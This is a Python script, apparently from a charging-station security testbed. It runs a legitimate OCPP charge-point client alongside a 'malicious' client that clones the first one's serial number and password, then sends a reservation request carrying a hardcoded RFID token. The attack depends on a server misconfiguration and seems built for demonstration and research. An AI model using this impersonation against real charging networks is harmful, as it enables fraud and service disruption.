import sys
sys.path.append('.')

import asyncio

import yaml
CONFIG_FILE = 'charging/server_config.yaml'
# Open server config file
with open(CONFIG_FILE, "r") as file: 
    try:
        # Parse YAML content
        content = yaml.safe_load(file)

        if "version" in content:
            VERSION = content["version"]
    except yaml.YAMLError as e:
        print('Failed to parse server_config.yaml')

if VERSION == 'v2_0_1':
    from charging.client.v2_0_1.client1 import launch_client, get_host_and_port, ChargePointClient, wait_for_button_press
elif VERSION == 'v1_6':
    from charging.client.v1_6.client1 import launch_client, get_host_and_port, ChargePointClient, wait_for_button_press

from charging.api_client import send_reservation_request


# ID of the RFID token used to authenticate
RFID_TOKEN = '11223344'

# Config of the charging points
CONFIG = {
        'vendor_name': 'EurecomCharge',
        'model': 'E2507',
        'serial_number': 'E2507-8420-1274',
        'password': 'HPEufO4u3IMl1G',
        'server': "[fe80::e3a6:46e4:bff9:fb8e%ens33]",
        'port': 9000
    }


async def legit_client_runnable(cp: ChargePointClient):
    cp.print_message("Legit client is connected")


async def malicious_client_runnable(cp: ChargePointClient):
    cp.print_message("Malicious client is connected (with the same serial number)")

    await wait_for_button_press('SEND RESERVATION REQUEST FROM EXTERNAL APP')

    # Send reservation request to all chargers with given serial number
    send_reservation_request(CONFIG['serial_number'], 'ISO14443', RFID_TOKEN)


async def main():
    print("For scenario to work, 'allow_multiple_serial_numbers' must be set to true")

    # Launch legit client and authorize
    legit_client = asyncio.create_task(
        launch_client(**CONFIG, **get_host_and_port(), async_runnable=legit_client_runnable, printed_name='Legit')
    )

    # Wait
    await asyncio.sleep(1)

    # Launch malicious client and do the rest
    malicious_client = asyncio.create_task(
        launch_client(**CONFIG, **get_host_and_port(), async_runnable=malicious_client_runnable, printed_name='Malicious')
    )

    # Await
    await legit_client
    await malicious_client


if __name__ == '__main__':
    asyncio.run(main())
